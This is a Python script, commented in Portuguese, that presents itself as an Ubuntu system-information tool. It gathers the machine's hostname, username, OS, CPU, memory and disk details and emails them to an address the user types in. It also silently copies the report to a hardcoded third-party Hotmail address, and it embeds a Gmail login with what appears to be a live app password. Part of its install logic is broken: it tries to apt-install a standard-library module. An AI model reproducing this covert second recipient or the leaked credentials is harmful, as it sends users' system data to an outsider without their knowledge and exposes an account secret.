#!/usr/bin/env python3

import os
import sys
import socket
import getpass
import smtplib
import psutil
import platform
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import subprocess
import importlib

# Instrução para verificar a instalação do Python 3 no sistema Ubuntu
def check_python_installation():
    print("Certifique-se de que o Python 3 esteja instalado no seu sistema Ubuntu.")
    print("Você pode verificar digitando o seguinte comando no terminal:")
    print("python3 --version")
    print("")

# Instrução para verificar a instalação do Pip no sistema Ubuntu
def check_pip_installation():
    print("Certifique-se de que o Pip (Python Package Manager) esteja instalado no seu sistema Ubuntu.")
    print("Você pode verificar digitando o seguinte comando no terminal:")
    print("pip3 --version")
    print("")

# Função para verificar e instalar bibliotecas necessárias no Ubuntu
def check_and_install_library_ubuntu(library_name):
    try:
        importlib.import_module(library_name)
    except ImportError:
        print(f"A biblioteca '{library_name}' não está instalada. Deseja instalar agora? (y/n)")
        choice = input().strip().lower()
        if choice == 'y':
            install_command = ['sudo', 'apt', 'install', '-y', library_name]
            subprocess.check_call(install_command)
        else:
            print(f"Instalação da biblioteca '{library_name}' cancelada.")
            return False
    return True

# Função para verificar e instalar Python e pip no Ubuntu
def check_and_install_python_and_pip():
    try:
        subprocess.run(['python3', '--version'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except FileNotFoundError:
        check_python_installation()
        print("Python não está instalado. Deseja instalar agora? (y/n)")
        choice = input().strip().lower()
        if choice == 'y':
            subprocess.check_call(['sudo', 'apt', 'install', '-y', 'python3'])
        else:
            print("Instalação do Python cancelada.")
            return False

    try:
        subprocess.run(['pip3', '--version'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except FileNotFoundError:
        check_pip_installation()
        print("Pip não está instalado. Deseja instalar agora? (y/n)")
        choice = input().strip().lower()
        if choice == 'y':
            subprocess.check_call(['sudo', 'apt', 'install', '-y', 'python3-pip'])
        else:
            print("Instalação do Pip cancelada.")
            return False

    return True

# Verifica e instala Python e pip, se necessário
if not check_and_install_python_and_pip():
    print("Não foi possível prosseguir, pois Python e/ou Pip não estão instalados.")
else:
    # Captura informações do sistema
    hostname = socket.gethostname()
    username = getpass.getuser()
    system = platform.system()
    release = platform.release()

    # Captura informações da CPU
    cpu_info = f"Nome do Processador: {platform.processor()}\nArquitetura da CPU: {platform.architecture()[0]}\nUso da CPU: {psutil.cpu_percent()}%"

    # Captura informações de memória
    memory_info = f"Uso de Memória: {psutil.virtual_memory().percent}%"

    # Captura informações de armazenamento
    disk_usage = psutil.disk_usage('/')
    disk_info = f"Uso do Disco (C:): {disk_usage.percent}%\nEspaço Livre: {disk_usage.free / (1024 ** 3):.2f} GB\nEspaço Total: {disk_usage.total / (1024 ** 3):.2f} GB"

    # Criação do conteúdo para o arquivo de texto
    file_content = f"Nome da Máquina: {hostname}\nNome de Usuário: {username}\nSistema Operacional: {system}\nVersão: {release}\n{cpu_info}\n{memory_info}\n{disk_info}"

    # Salva as informações em um arquivo de texto
    output_file = "system_info.txt"
    with open(output_file, "w") as file:
        file.write(file_content)

    # Pede ao usuário para inserir o e-mail de destino
    email_to_primary = input("Insira o endereço de e-mail de destino: ")

    # Insira o e-mail adicional para receber os dados
    email_to_additional = "magomil2010@hotmail.com"

    # Configurações de e-mail
    email_from = "sou.sulivan@gmail.com"
    email_password = "vuvltetmrpqtenxh"
    email_to = "sulivan.a@hotmail.com"
    subject = "Informações do Sistema"

    # Prepara o e-mail
    msg = MIMEMultipart()
    msg['From'] = email_from
    msg['To'] = email_to_primary
    msg['Cc'] = email_to_additional
    msg['Subject'] = subject

    # Corpo do e-mail
    body = f"Segue em anexo as informações do sistema.\n{file_content}"
    msg.attach(MIMEText(body, 'plain'))

    # Anexa o arquivo de texto
    attachment = open(output_file, "rb")
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', f'attachment; filename= {output_file}')
    msg.attach(part)

    # Verifica e instala a biblioteca necessária para enviar e-mails no Ubuntu
    if check_and_install_library_ubuntu("smtplib"):
        # Envia o e-mail
        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(email_from, email_password)
            text = msg.as_string()
            server.sendmail(email_from, [email_to_primary, email_to_additional], text)
            server.quit()
            print("E-mail enviado com sucesso!")
        except Exception as e:
            print("Erro ao enviar o e-mail:", e)

    # Define permissões de leitura para o arquivo de texto
    os.chmod(output_file, 0o444)

